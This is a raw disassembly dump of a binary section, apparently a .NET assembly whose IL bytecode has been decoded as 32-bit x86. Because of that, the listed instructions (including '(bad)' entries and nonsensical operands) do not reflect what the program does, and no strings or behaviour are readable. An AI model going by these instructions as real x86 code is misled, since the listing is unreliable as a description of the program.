  40465f:	00 0a                	add    %cl,(%edx)
  404661:	dc de                	(bad)
  404663:	03 26                	add    (%esi),%esp
  404665:	de 00                	fiadds (%eax)
  404667:	16                   	push   %ss
  404668:	2a 11                	sub    (%ecx),%dl
  40466a:	05 2a 01 34 00       	add    $0x34012a,%eax
  40466f:	00 02                	add    %al,(%edx)
  404671:	00 19                	add    %bl,(%ecx)
  404673:	00 8b a4 00 0a 00    	add    %cl,0xa00a4(%ebx)
  404679:	00 00                	add    %al,(%eax)
  40467b:	00 02                	add    %al,(%edx)
  40467d:	00 12                	add    %dl,(%edx)
  40467f:	00 9e b0 00 0a 00    	add    %bl,0xa00b0(%esi)
  404685:	00 00                	add    %al,(%eax)
  404687:	00 02                	add    %al,(%edx)
  404689:	00 0b                	add    %cl,(%ebx)
  40468b:	00 b1 bc 00 0a 00    	add    %dh,0xa00bc(%ecx)
  404691:	00 00                	add    %al,(%eax)
  404693:	00 00                	add    %al,(%eax)
  404695:	00 00                	add    %al,(%eax)
  404697:	00 c8                	add    %cl,%al
  404699:	c8 00 03 01          	enter  $0x300,$0x1
  40469d:	00 00                	add    %al,(%eax)
  40469f:	01 1b                	add    %ebx,(%ebx)
  4046a1:	30 02                	xor    %al,(%edx)
  4046a3:	00 1f                	add    %bl,(%edi)
  4046a5:	00 00                	add    %al,(%eax)
  4046a7:	00 1a                	add    %bl,(%edx)
  4046a9:	00 00                	add    %al,(%eax)
  4046ab:	11 16                	adc    %edx,(%esi)
  4046ad:	0a 28                	or     (%eax),%ch
  4046af:	88 00                	mov    %al,(%eax)
  4046b1:	00 0a                	add    %cl,(%edx)
  4046b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b4:	b8 00 00 0a 12       	mov    $0x120a0000,%eax
  4046b9:	00 28                	add    %ch,(%eax)
  4046bb:	79 00                	jns    0x4046bd
  4046bd:	00 06                	add    %al,(%esi)
  4046bf:	26 06                	es push %es
  4046c1:	0b de                	or     %esi,%ebx
  4046c3:	05 26 06 0b de       	add    $0xde0b0626,%eax
  4046c8:	00 07                	add    %al,(%edi)
  4046ca:	2a 00                	sub    (%eax),%al
  4046cc:	01 10                	add    %edx,(%eax)
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	00 00                	add    %al,(%eax)
  4046d2:	02 00                	add    (%eax),%al
  4046d4:	16                   	push   %ss
  4046d5:	18 00                	sbb    %al,(%eax)
  4046d7:	05 01 00 00 01       	add    $0x1000001,%eax
  4046dc:	1b 30                	sbb    (%eax),%esi
  4046de:	01 00                	add    %eax,(%eax)
  4046e0:	23 00                	and    (%eax),%eax
  4046e2:	00 00                	add    %al,(%eax)
  4046e4:	1b 00                	sbb    (%eax),%eax
  4046e6:	00 11                	add    %dl,(%ecx)
  4046e8:	72 01                	jb     0x4046eb
  4046ea:	24 00                	and    $0x0,%al
  4046ec:	70 28                	jo     0x404716
  4046ee:	78 00                	js     0x4046f0
  4046f0:	00 06                	add    %al,(%esi)
  4046f2:	0a 12                	or     (%edx),%dl
  4046f4:	00 28                	add    %ch,(%eax)
  4046f6:	b9 00 00 0a 2c       	mov    $0x2c0a0000,%ecx
  4046fb:	04 17                	add    $0x17,%al
  4046fd:	0b de                	or     %esi,%ebx
  4046ff:	09 16                	or     %edx,(%esi)
  404701:	0b de                	or     %esi,%ebx
  404703:	05 26 16 0b de       	add    $0xde0b1626,%eax
  404708:	00 07                	add    %al,(%edi)
  40470a:	2a 00                	sub    (%eax),%al
  40470c:	01 10                	add    %edx,(%eax)
  40470e:	00 00                	add    %al,(%eax)
  404710:	00 00                	add    %al,(%eax)
  404712:	00 00                	add    %al,(%eax)
  404714:	1c 1c                	sbb    $0x1c,%al
  404716:	00 05 01 00 00 01    	add    %al,0x1000001
  40471c:	1b 30                	sbb    (%eax),%esi
  40471e:	02 00                	add    (%eax),%al
  404720:	65 00 00             	add    %al,%gs:(%eax)
  404723:	00 1c 00             	add    %bl,(%eax,%eax,1)
  404726:	00 11                	add    %dl,(%ecx)
  404728:	28 8d 00 00 0a 0a    	sub    %cl,0xa0a0000(%ebp)
  40472e:	16                   	push   %ss
  40472f:	0b 2b                	or     (%ebx),%ebp
  404731:	3d 06 07 9a 0c       	cmp    $0xc9a0706,%eax
  404736:	02 08                	add    (%eax),%cl
  404738:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  40473c:	06                   	push   %es
  40473d:	6f                   	outsl  %ds:(%esi),(%dx)
  40473e:	5b                   	pop    %ebx
  40473f:	00 00                	add    %al,(%eax)
  404741:	0a 72 19             	or     0x19(%edx),%dh
  404744:	24 00                	and    $0x0,%al
  404746:	70 6f                	jo     0x4047b7
  404748:	b0 00                	mov    $0x0,%al
  40474a:	00 0a                	add    %cl,(%edx)
  40474c:	2c 18                	sub    $0x18,%al
  40474e:	7e 10                	jle    0x404760
  404750:	00 00                	add    %al,(%eax)
  404752:	04 72                	add    $0x72,%al
  404754:	39 24 00             	cmp    %esp,(%eax,%eax,1)
  404757:	70 28                	jo     0x404781
  404759:	8d 00                	lea    (%eax),%eax
  40475b:	00 06                	add    %al,(%esi)
  40475d:	26 72 39             	es jb  0x404799
  404760:	24 00                	and    $0x0,%al
  404762:	70 0d                	jo     0x404771
  404764:	de 25 de 03 26 de    	fisubs 0xde2603de
  40476a:	00 07                	add    %al,(%edi)
  40476c:	17                   	pop    %ss
  40476d:	58                   	pop    %eax
  40476e:	0b 07                	or     (%edi),%eax
  404770:	06                   	push   %es
  404771:	8e 69 32             	mov    0x32(%ecx),%gs
  404774:	bd 7e 10 00 00       	mov    $0x107e,%ebp
  404779:	04 72                	add    $0x72,%al
  40477b:	37                   	aaa
  40477c:	21 00                	and    %eax,(%eax)
  40477e:	70 28                	jo     0x4047a8
  404780:	8d 00                	lea    (%eax),%eax
  404782:	00 06                	add    %al,(%esi)
  404784:	26 72 37             	es jb  0x4047be
  404787:	21 00                	and    %eax,(%eax)
  404789:	70 2a                	jo     0x4047b5
  40478b:	09 2a                	or     %ebp,(%edx)
  40478d:	00 00                	add    %al,(%eax)
  40478f:	00 01                	add    %al,(%ecx)
  404791:	10 00                	adc    %al,(%eax)
  404793:	00 00                	add    %al,(%eax)
  404795:	00 0e                	add    %cl,(%esi)
  404797:	00 32                	add    %dh,(%edx)
  404799:	40                   	inc    %eax
  40479a:	00 03                	add    %al,(%ebx)
  40479c:	01 00                	add    %eax,(%eax)
  40479e:	00 01                	add    %al,(%ecx)
  4047a0:	1b 30                	sbb    (%eax),%esi
  4047a2:	02 00                	add    (%eax),%al
  4047a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a5:	00 00                	add    %al,(%eax)
  4047a7:	00 1d 00 00 11 72    	add    %bl,0x72110000
  4047ad:	3d 24 00 70 03       	cmp    $0x3700024,%eax
  4047b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4047b3:	ba 00 00 0a 0b       	mov    $0xb0a0000,%edx
  4047b8:	12 01                	adc    (%ecx),%al
  4047ba:	28 bb 00 00 0a 28    	sub    %bh,0x280a0000(%ebx)
  4047c0:	51                   	push   %ecx
  4047c1:	00 00                	add    %al,(%eax)
  4047c3:	0a 73 b1             	or     -0x4f(%ebx),%dh
  4047c6:	00 00                	add    %al,(%eax)
  4047c8:	0a 0a                	or     (%edx),%cl
  4047ca:	06                   	push   %es
  4047cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4047cc:	b2 00                	mov    $0x0,%dl
  4047ce:	00 0a                	add    %cl,(%edx)
  4047d0:	0c 08                	or     $0x8,%al
  4047d2:	28 01                	sub    %al,(%ecx)
  4047d4:	00 00                	add    %al,(%eax)
  4047d6:	2b 28                	sub    (%eax),%ebp
  4047d8:	02 00                	add    (%eax),%al
  4047da:	00 2b                	add    %ch,(%ebx)
  4047dc:	25 2d 04 26 14       	and    $0x1426042d,%eax
  4047e1:	2b 16                	sub    (%esi),%edx
  4047e3:	72 af                	jb     0x404794
  4047e5:	24 00                	and    $0x0,%al
  4047e7:	70 28                	jo     0x404811
  4047e9:	b5 00                	mov    $0x0,%ch
  4047eb:	00 0a                	add    %cl,(%edx)
  4047ed:	25 2d 04 26 14       	and    $0x1426042d,%eax
  4047f2:	2b 05 6f 38 00 00    	sub    0x386f,%eax
  4047f8:	0a 0d de 1d 08 2c    	or     0x2c081dde,%cl
  4047fe:	06                   	push   %es
  4047ff:	08 6f 33             	or     %ch,0x33(%edi)
  404802:	00 00                	add    %al,(%eax)
  404804:	0a dc                	or     %ah,%bl
  404806:	06                   	push   %es
  404807:	2c 06                	sub    $0x6,%al
  404809:	06                   	push   %es
  40480a:	6f                   	outsl  %ds:(%esi),(%dx)
  40480b:	33 00                	xor    (%eax),%eax
  40480d:	00 0a                	add    %cl,(%edx)
  40480f:	dc 26                	fsubl  (%esi)
  404811:	de 00                	fiadds (%eax)
  404813:	72 ed                	jb     0x404802
  404815:	20 00                	and    %al,(%eax)
  404817:	70 2a                	jo     0x404843
  404819:	09 2a                	or     %ebp,(%edx)
  40481b:	00 01                	add    %al,(%ecx)
  40481d:	28 00                	sub    %al,(%eax)
  40481f:	00 02                	add    %al,(%edx)
  404821:	00 25 00 2b 50 00    	add    %ah,0x502b00
  404827:	0a 00                	or     (%eax),%al
  404829:	00 00                	add    %al,(%eax)
  40482b:	00 02                	add    %al,(%edx)
  40482d:	00 1e                	add    %bl,(%esi)
  40482f:	00 3c 5a             	add    %bh,(%edx,%ebx,2)
  404832:	00 0a                	add    %cl,(%edx)
	...
  40483c:	64 64 00 03          	fs add %al,%fs:(%ebx)
  404840:	01 00                	add    %eax,(%eax)
  404842:	00 01                	add    %al,(%ecx)
  404844:	1b 30                	sbb    (%eax),%esi
  404846:	04 00                	add    $0x0,%al
  404848:	5f                   	pop    %edi
  404849:	00 00                	add    %al,(%eax)
  40484b:	00 1e                	add    %bl,(%esi)
  40484d:	00 00                	add    %al,(%eax)
  40484f:	11 1b                	adc    %ebx,(%ebx)
  404851:	8d 01                	lea    (%ecx),%eax
  404853:	00 00                	add    %al,(%eax)
  404855:	01 25 16 28 be 00    	add    %esp,0xbe2816
  40485b:	00 0a                	add    %cl,(%edx)
  40485d:	8c 72 00             	mov    %?,0x0(%edx)
  404860:	00 01                	add    %al,(%ecx)
  404862:	a2 25 17 28 bf       	mov    %al,0xbf281725
  404867:	00 00                	add    %al,(%eax)
  404869:	0a a2 25 18 28 c0    	or     -0x3fd7e7db(%edx),%ah
  40486f:	00 00                	add    %al,(%eax)
  404871:	0a a2 25 19 28 c1    	or     -0x3ed7e6db(%edx),%ah
  404877:	00 00                	add    %al,(%eax)
  404879:	0a a2 25 1a 28 aa    	or     -0x55d7e5db(%edx),%ah
  40487f:	00 00                	add    %al,(%eax)
  404881:	0a 28                	or     (%eax),%ch
  404883:	ab                   	stos   %eax,%es:(%edi)
  404884:	00 00                	add    %al,(%eax)
  404886:	0a 73 ac             	or     -0x54(%ebx),%dh
  404889:	00 00                	add    %al,(%eax)
  40488b:	0a 28                	or     (%eax),%ch
  40488d:	ad                   	lods   %ds:(%esi),%eax
  40488e:	00 00                	add    %al,(%eax)
  404890:	0a 8c 51 00 00 01 a2 	or     -0x5dff0000(%ecx,%edx,2),%cl
  404897:	28 c2                	sub    %al,%dl
  404899:	00 00                	add    %al,(%eax)
  40489b:	0a 28                	or     (%eax),%ch
  40489d:	7f 00                	jg     0x40489f
  40489f:	00 06                	add    %al,(%esi)
  4048a1:	0a de                	or     %dh,%bl
  4048a3:	09 26                	or     %esp,(%esi)
  4048a5:	72 c7                	jb     0x40486e
  4048a7:	24 00                	and    $0x0,%al
  4048a9:	70 0a                	jo     0x4048b5
  4048ab:	de 00                	fiadds (%eax)
  4048ad:	06                   	push   %es
  4048ae:	2a 00                	sub    (%eax),%al
  4048b0:	01 10                	add    %edx,(%eax)
  4048b2:	00 00                	add    %al,(%eax)
  4048b4:	00 00                	add    %al,(%eax)
  4048b6:	00 00                	add    %al,(%eax)
  4048b8:	54                   	push   %esp
  4048b9:	54                   	push   %esp
  4048ba:	00 09                	add    %cl,(%ecx)
  4048bc:	01 00                	add    %eax,(%eax)
  4048be:	00 01                	add    %al,(%ecx)
  4048c0:	13 30                	adc    (%eax),%esi
  4048c2:	03 00                	add    (%eax),%eax
  4048c4:	5a                   	pop    %edx
  4048c5:	00 00                	add    %al,(%eax)
  4048c7:	00 1f                	add    %bl,(%edi)
  4048c9:	00 00                	add    %al,(%eax)
  4048cb:	11 73 c3             	adc    %esi,-0x3d(%ebx)
  4048ce:	00 00                	add    %al,(%eax)
  4048d0:	0a 28                	or     (%eax),%ch
  4048d2:	c4 00                	les    (%eax),%eax
  4048d4:	00 0a                	add    %cl,(%edx)
  4048d6:	02 6f 21             	add    0x21(%edi),%ch
  4048d9:	00 00                	add    %al,(%eax)
  4048db:	0a 0a                	or     (%edx),%cl
  4048dd:	06                   	push   %es
  4048de:	6f                   	outsl  %ds:(%esi),(%dx)
  4048df:	c5 00                	lds    (%eax),%eax
  4048e1:	00 0a                	add    %cl,(%edx)
  4048e3:	0a 73 53             	or     0x53(%ebx),%dh
  4048e6:	00 00                	add    %al,(%eax)
  4048e8:	0a 0b                	or     (%ebx),%cl
  4048ea:	06                   	push   %es
  4048eb:	0c 16                	or     $0x16,%al
  4048ed:	0d 2b 1c 08 09       	or     $0x9081c2b,%eax
  4048f2:	91                   	xchg   %eax,%ecx
  4048f3:	13 04 07             	adc    (%edi,%eax,1),%eax
  4048f6:	12 04 72             	adc    (%edx,%esi,2),%al
  4048f9:	d9 24 00             	fldenv (%eax,%eax,1)
  4048fc:	70 28                	jo     0x404926
  4048fe:	c6 00 00             	movb   $0x0,(%eax)
  404901:	0a 6f 55             	or     0x55(%edi),%ch
  404904:	00 00                	add    %al,(%eax)
  404906:	0a 26                	or     (%esi),%ah
  404908:	09 17                	or     %edx,(%edi)
  40490a:	58                   	pop    %eax
  40490b:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  404910:	32 de                	xor    %dh,%bl
  404912:	07                   	pop    %es
  404913:	6f                   	outsl  %ds:(%esi),(%dx)
  404914:	38 00                	cmp    %al,(%eax)
  404916:	00 0a                	add    %cl,(%edx)
  404918:	16                   	push   %ss
  404919:	1f                   	pop    %ds
  40491a:	14 6f                	adc    $0x6f,%al
  40491c:	c7 00 00 0a 6f c8    	movl   $0xc86f0a00,(%eax)
  404922:	00 00                	add    %al,(%eax)
  404924:	0a 2a                	or     (%edx),%ch
  404926:	00 00                	add    %al,(%eax)
  404928:	13 30                	adc    (%eax),%esi
  40492a:	07                   	pop    %es
  40492b:	00 b3 01 00 00 20    	add    %dh,0x20000001(%ebx)
  404931:	00 00                	add    %al,(%eax)
  404933:	11 73 62             	adc    %esi,0x62(%ebx)
  404936:	00 00                	add    %al,(%eax)
  404938:	06                   	push   %es
  404939:	25 72 01 21 00       	and    $0x210172,%eax
  40493e:	70 6f                	jo     0x4049af
  404940:	4d                   	dec    %ebp
  404941:	00 00                	add    %al,(%eax)
  404943:	06                   	push   %es
  404944:	72 df                	jb     0x404925
  404946:	24 00                	and    $0x0,%al
  404948:	70 6f                	jo     0x4049b9
  40494a:	5a                   	pop    %edx
  40494b:	00 00                	add    %al,(%eax)
  40494d:	06                   	push   %es
  40494e:	25 72 f5 24 00       	and    $0x24f572,%eax
  404953:	70 6f                	jo     0x4049c4
  404955:	4d                   	dec    %ebp
  404956:	00 00                	add    %al,(%eax)
  404958:	06                   	push   %es
  404959:	7e 10                	jle    0x40496b
  40495b:	00 00                	add    %al,(%eax)
  40495d:	04 6f                	add    $0x6f,%al
  40495f:	5a                   	pop    %edx
  404960:	00 00                	add    %al,(%eax)
  404962:	06                   	push   %es
  404963:	25 72 ff 24 00       	and    $0x24ff72,%eax
  404968:	70 6f                	jo     0x4049d9
  40496a:	4d                   	dec    %ebp
  40496b:	00 00                	add    %al,(%eax)
  40496d:	06                   	push   %es
  40496e:	28 bf 00 00 0a 6f    	sub    %bh,0x6f0a0000(%edi)
  404974:	38 00                	cmp    %al,(%eax)
  404976:	00 0a                	add    %cl,(%edx)
  404978:	6f                   	outsl  %ds:(%esi),(%dx)
  404979:	5a                   	pop    %edx
  40497a:	00 00                	add    %al,(%eax)
  40497c:	06                   	push   %es
  40497d:	25 72 09 25 00       	and    $0x250972,%eax
  404982:	70 6f                	jo     0x4049f3
  404984:	4d                   	dec    %ebp
  404985:	00 00                	add    %al,(%eax)
  404987:	06                   	push   %es
  404988:	73 ae                	jae    0x404938
  40498a:	00 00                	add    %al,(%eax)
  40498c:	0a 28                	or     (%eax),%ch
  40498e:	af                   	scas   %es:(%edi),%eax
  40498f:	00 00                	add    %al,(%eax)
  404991:	0a 6f 38             	or     0x38(%edi),%ch
  404994:	00 00                	add    %al,(%eax)
  404996:	0a 72 0f             	or     0xf(%edx),%dh
  404999:	25 00 70 14 6f       	and    $0x6f147000,%eax
  40499e:	c9                   	leave
  40499f:	00 00                	add    %al,(%eax)
  4049a1:	0a 72 23             	or     0x23(%edx),%dh
  4049a4:	25 00 70 28 ca       	and    $0xca287000,%eax
  4049a9:	00 00                	add    %al,(%eax)
  4049ab:	0a 0a                	or     (%edx),%cl
  4049ad:	12 00                	adc    (%eax),%al
  4049af:	28 cb                	sub    %cl,%bl
  4049b1:	00 00                	add    %al,(%eax)
  4049b3:	0a 72 27             	or     0x27(%edx),%dh
  4049b6:	25 00 70 72 31       	and    $0x31727000,%eax
  4049bb:	25 00 70 6f c9       	and    $0xc96f7000,%eax
  4049c0:	00 00                	add    %al,(%eax)
  4049c2:	0a 72 3d             	or     0x3d(%edx),%dh
  4049c5:	25 00 70 72 49       	and    $0x49727000,%eax
  4049ca:	25 00 70 6f c9       	and    $0xc96f7000,%eax
  4049cf:	00 00                	add    %al,(%eax)
  4049d1:	0a 28                	or     (%eax),%ch
  4049d3:	9c                   	pushf
  4049d4:	00 00                	add    %al,(%eax)
  4049d6:	0a 6f 5a             	or     0x5a(%edi),%ch
  4049d9:	00 00                	add    %al,(%eax)
  4049db:	06                   	push   %es
  4049dc:	25 72 55 25 00       	and    $0x255572,%eax
  4049e1:	70 6f                	jo     0x404a52
  4049e3:	4d                   	dec    %ebp
  4049e4:	00 00                	add    %al,(%eax)
  4049e6:	06                   	push   %es
  4049e7:	28 cc                	sub    %cl,%ah
  4049e9:	00 00                	add    %al,(%eax)
  4049eb:	0a 6f 5a             	or     0x5a(%edi),%ch
  4049ee:	00 00                	add    %al,(%eax)
  4049f0:	06                   	push   %es
  4049f1:	25 72 5f 25 00       	and    $0x255f72,%eax
  4049f6:	70 6f                	jo     0x404a67
  4049f8:	4d                   	dec    %ebp
  4049f9:	00 00                	add    %al,(%eax)
  4049fb:	06                   	push   %es
  4049fc:	7e 03                	jle    0x404a01
  4049fe:	00 00                	add    %al,(%eax)
  404a00:	04 6f                	add    $0x6f,%al
  404a02:	5a                   	pop    %edx
  404a03:	00 00                	add    %al,(%eax)
  404a05:	06                   	push   %es
  404a06:	25 72 6f 25 00       	and    $0x256f72,%eax
  404a0b:	70 6f                	jo     0x404a7c
  404a0d:	4d                   	dec    %ebp
  404a0e:	00 00                	add    %al,(%eax)
  404a10:	06                   	push   %es
  404a11:	28 81 00 00 06 0a    	sub    %al,0xa060000(%ecx)
  404a17:	12 00                	adc    (%eax),%al
  404a19:	28 cb                	sub    %cl,%bl
  404a1b:	00 00                	add    %al,(%eax)
  404a1d:	0a 6f 5b             	or     0x5b(%edi),%ch
  404a20:	00 00                	add    %al,(%eax)
  404a22:	0a 72 7b             	or     0x7b(%edx),%dh
  404a25:	25 00 70 72 6f       	and    $0x6f727000,%eax
  404a2a:	25 00 70 6f c9       	and    $0xc96f7000,%eax
  404a2f:	00 00                	add    %al,(%eax)
  404a31:	0a 72 85             	or     -0x7b(%edx),%dh
  404a34:	25 00 70 72 ff       	and    $0xff727000,%eax
  404a39:	24 00                	and    $0x0,%al
  404a3b:	70 6f                	jo     0x404aac
  404a3d:	c9                   	leave
  404a3e:	00 00                	add    %al,(%eax)
  404a40:	0a 6f 5a             	or     0x5a(%edi),%ch
  404a43:	00 00                	add    %al,(%eax)
  404a45:	06                   	push   %es
  404a46:	25 72 91 25 00       	and    $0x259172,%eax
  404a4b:	70 6f                	jo     0x404abc
  404a4d:	4d                   	dec    %ebp
  404a4e:	00 00                	add    %al,(%eax)
  404a50:	06                   	push   %es
  404a51:	72 29                	jb     0x404a7c
  404a53:	21 00                	and    %eax,(%eax)
  404a55:	70 7e                	jo     0x404ad5
  404a57:	10 00                	adc    %al,(%eax)
  404a59:	00 04 28             	add    %al,(%eax,%ebp,1)
  404a5c:	8e 00                	mov    (%eax),%es
  404a5e:	00 06                	add    %al,(%esi)
  404a60:	25 2d 06 26 72       	and    $0x7226062d,%eax
  404a65:	37                   	aaa
  404a66:	21 00                	and    %eax,(%eax)
  404a68:	70 28                	jo     0x404a92
  404a6a:	51                   	push   %ecx
  404a6b:	00 00                	add    %al,(%eax)
  404a6d:	0a 6f 5a             	or     0x5a(%edi),%ch
  404a70:	00 00                	add    %al,(%eax)
  404a72:	06                   	push   %es
  404a73:	25 72 a9 25 00       	and    $0x25a972,%eax
  404a78:	70 6f                	jo     0x404ae9
  404a7a:	4d                   	dec    %ebp
  404a7b:	00 00                	add    %al,(%eax)
  404a7d:	06                   	push   %es
  404a7e:	7e 0e                	jle    0x404a8e
  404a80:	00 00                	add    %al,(%eax)
  404a82:	04 6f                	add    $0x6f,%al
  404a84:	5a                   	pop    %edx
  404a85:	00 00                	add    %al,(%eax)
  404a87:	06                   	push   %es
  404a88:	25 72 bb 25 00       	and    $0x25bb72,%eax
  404a8d:	70 6f                	jo     0x404afe
  404a8f:	4d                   	dec    %ebp
  404a90:	00 00                	add    %al,(%eax)
  404a92:	06                   	push   %es
  404a93:	28 83 00 00 06 6f    	sub    %al,0x6f060000(%ebx)
  404a99:	5a                   	pop    %edx
  404a9a:	00 00                	add    %al,(%eax)
  404a9c:	06                   	push   %es
  404a9d:	25 72 cf 25 00       	and    $0x25cf72,%eax
  404aa2:	70 6f                	jo     0x404b13
  404aa4:	4d                   	dec    %ebp
  404aa5:	00 00                	add    %al,(%eax)
  404aa7:	06                   	push   %es
  404aa8:	28 cc                	sub    %cl,%ah
  404aaa:	00 00                	add    %al,(%eax)
  404aac:	0a 73 87             	or     -0x79(%ebx),%dh
  404aaf:	00 00                	add    %al,(%eax)
  404ab1:	0a 28                	or     (%eax),%ch
  404ab3:	cd 00                	int    $0x0
  404ab5:	00 0a                	add    %cl,(%edx)
  404ab7:	0b 12                	or     (%edx),%edx
  404ab9:	01 28                	add    %ebp,(%eax)
  404abb:	ce                   	into
  404abc:	00 00                	add    %al,(%eax)
  404abe:	0a 0b                	or     (%ebx),%cl
  404ac0:	12 01                	adc    (%ecx),%al
  404ac2:	28 cf                	sub    %cl,%bh
  404ac4:	00 00                	add    %al,(%eax)
  404ac6:	0a 6f 5a             	or     0x5a(%edi),%ch
  404ac9:	00 00                	add    %al,(%eax)
  404acb:	06                   	push   %es
  404acc:	25 72 e3 25 00       	and    $0x25e372,%eax
  404ad1:	70 6f                	jo     0x404b42
  404ad3:	4d                   	dec    %ebp
  404ad4:	00 00                	add    %al,(%eax)
  404ad6:	06                   	push   %es
  404ad7:	72 ed                	jb     0x404ac6
  404ad9:	20 00                	and    %al,(%eax)
  404adb:	70 6f                	jo     0x404b4c
  404add:	5a                   	pop    %edx
  404ade:	00 00                	add    %al,(%eax)
  404ae0:	06                   	push   %es
  404ae1:	6f                   	outsl  %ds:(%esi),(%dx)
  404ae2:	57                   	push   %edi
  404ae3:	00 00                	add    %al,(%eax)
  404ae5:	06                   	push   %es
  404ae6:	2a 00                	sub    (%eax),%al
  404ae8:	1b 30                	sbb    (%eax),%esi
  404aea:	02 00                	add    (%eax),%al
  404aec:	43                   	inc    %ebx
  404aed:	00 00                	add    %al,(%eax)
  404aef:	00 00                	add    %al,(%eax)
  404af1:	00 00                	add    %al,(%eax)
  404af3:	00 7e 0f             	add    %bh,0xf(%esi)
  404af6:	00 00                	add    %al,(%eax)
  404af8:	04 28                	add    $0x28,%al
  404afa:	17                   	pop    %ss
  404afb:	00 00                	add    %al,(%eax)
  404afd:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  404b00:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  404b06:	05 28 8b 00 00       	add    $0x8b28,%eax
  404b0b:	06                   	push   %es
  404b0c:	28 88 00 00 06 28    	sub    %cl,0x28060000(%eax)
  404b12:	08 00                	or     %al,(%eax)
  404b14:	00 06                	add    %al,(%esi)
  404b16:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  404b1b:	05 6f 76 00 00       	add    $0x766f,%eax
  404b20:	0a 28                	or     (%eax),%ch
  404b22:	06                   	push   %es
  404b23:	00 00                	add    %al,(%eax)
  404b25:	06                   	push   %es
  404b26:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  404b2b:	05 28 d3 00 00       	add    $0xd328,%eax
  404b30:	0a de                	or     %dh,%bl
  404b32:	03 26                	add    (%esi),%esp
  404b34:	de 00                	fiadds (%eax)
  404b36:	2a 00                	sub    (%eax),%al
  404b38:	01 10                	add    %edx,(%eax)
  404b3a:	00 00                	add    %al,(%eax)
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	00 00                	add    %al,(%eax)
  404b40:	3f                   	aas
  404b41:	3f                   	aas
  404b42:	00 03                	add    %al,(%ebx)
  404b44:	01 00                	add    %eax,(%eax)
  404b46:	00 01                	add    %al,(%ecx)
  404b48:	1b 30                	sbb    (%eax),%esi
  404b4a:	03 00                	add    (%eax),%eax
  404b4c:	a0 00 00 00 21       	mov    0x21000000,%al
  404b51:	00 00                	add    %al,(%eax)
  404b53:	11 72 ed             	adc    %esi,-0x13(%edx)
  404b56:	25 00 70 28 c0       	and    $0xc0287000,%eax
  404b5b:	00 00                	add    %al,(%eax)
  404b5d:	0a 72 f3             	or     -0xd(%edx),%dh
  404b60:	25 00 70 28 9c       	and    $0x9c287000,%eax
  404b65:	00 00                	add    %al,(%eax)
  404b67:	0a 72 1f             	or     0x1f(%edx),%dh
  404b6a:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404b6e:	d4 00                	aam    $0x0
  404b70:	00 0a                	add    %cl,(%edx)
  404b72:	0a 73 d5             	or     -0x2b(%ebx),%dh
  404b75:	00 00                	add    %al,(%eax)
  404b77:	0a 0b                	or     (%ebx),%cl
  404b79:	06                   	push   %es
  404b7a:	6f                   	outsl  %ds:(%esi),(%dx)
  404b7b:	b2 00                	mov    $0x0,%dl
  404b7d:	00 0a                	add    %cl,(%edx)
  404b7f:	6f                   	outsl  %ds:(%esi),(%dx)
  404b80:	b3 00                	mov    $0x0,%bl
  404b82:	00 0a                	add    %cl,(%edx)
  404b84:	0c 2b                	or     $0x2b,%al
  404b86:	1d 08 6f b4 00       	sbb    $0xb46f08,%eax
  404b8b:	00 0a                	add    %cl,(%edx)
  404b8d:	0d 07 09 72 5d       	or     $0x5d720907,%eax
  404b92:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404b96:	b5 00                	mov    $0x0,%ch
  404b98:	00 0a                	add    %cl,(%edx)
  404b9a:	6f                   	outsl  %ds:(%esi),(%dx)
  404b9b:	38 00                	cmp    %al,(%eax)
  404b9d:	00 0a                	add    %cl,(%edx)
  404b9f:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba0:	d6                   	salc
  404ba1:	00 00                	add    %al,(%eax)
  404ba3:	0a 08                	or     (%eax),%cl
  404ba5:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba6:	b7 00                	mov    $0x0,%bh
  404ba8:	00 0a                	add    %cl,(%edx)
  404baa:	2d db de 0a 08       	sub    $0x80adedb,%eax
  404baf:	2c 06                	sub    $0x6,%al
  404bb1:	08 6f 33             	or     %ch,0x33(%edi)
  404bb4:	00 00                	add    %al,(%eax)
  404bb6:	0a dc                	or     %ah,%bl
  404bb8:	07                   	pop    %es
  404bb9:	6f                   	outsl  %ds:(%esi),(%dx)
  404bba:	d7                   	xlat   %ds:(%ebx)
  404bbb:	00 00                	add    %al,(%eax)
  404bbd:	0a 2d 09 72 75 26    	or     0x26757209,%ch
  404bc3:	00 70 13             	add    %dh,0x13(%eax)
  404bc6:	04 de                	add    $0xde,%al
  404bc8:	28 72 7d             	sub    %dh,0x7d(%edx)
  404bcb:	26 00 70 07          	add    %dh,%es:0x7(%eax)
  404bcf:	6f                   	outsl  %ds:(%esi),(%dx)
  404bd0:	d8 00                	fadds  (%eax)
  404bd2:	00 0a                	add    %cl,(%edx)
  404bd4:	28 d9                	sub    %bl,%cl
  404bd6:	00 00                	add    %al,(%eax)
  404bd8:	0a 13                	or     (%ebx),%dl
  404bda:	04 de                	add    $0xde,%al
  404bdc:	14 06                	adc    $0x6,%al
  404bde:	2c 06                	sub    $0x6,%al
  404be0:	06                   	push   %es
  404be1:	6f                   	outsl  %ds:(%esi),(%dx)
  404be2:	33 00                	xor    (%eax),%eax
  404be4:	00 0a                	add    %cl,(%edx)
  404be6:	dc 26                	fsubl  (%esi)
  404be8:	72 75                	jb     0x404c5f
  404bea:	26 00 70 13          	add    %dh,%es:0x13(%eax)
  404bee:	04 de                	add    $0xde,%al
  404bf0:	00 11                	add    %dl,(%ecx)
  404bf2:	04 2a                	add    $0x2a,%al
  404bf4:	01 28                	add    %ebp,(%eax)
  404bf6:	00 00                	add    %al,(%eax)
  404bf8:	02 00                	add    (%eax),%al
  404bfa:	31 00                	xor    %eax,(%eax)
  404bfc:	29 5a 00             	sub    %ebx,0x0(%edx)
  404bff:	0a 00                	or     (%eax),%al
  404c01:	00 00                	add    %al,(%eax)
  404c03:	00 02                	add    %al,(%edx)
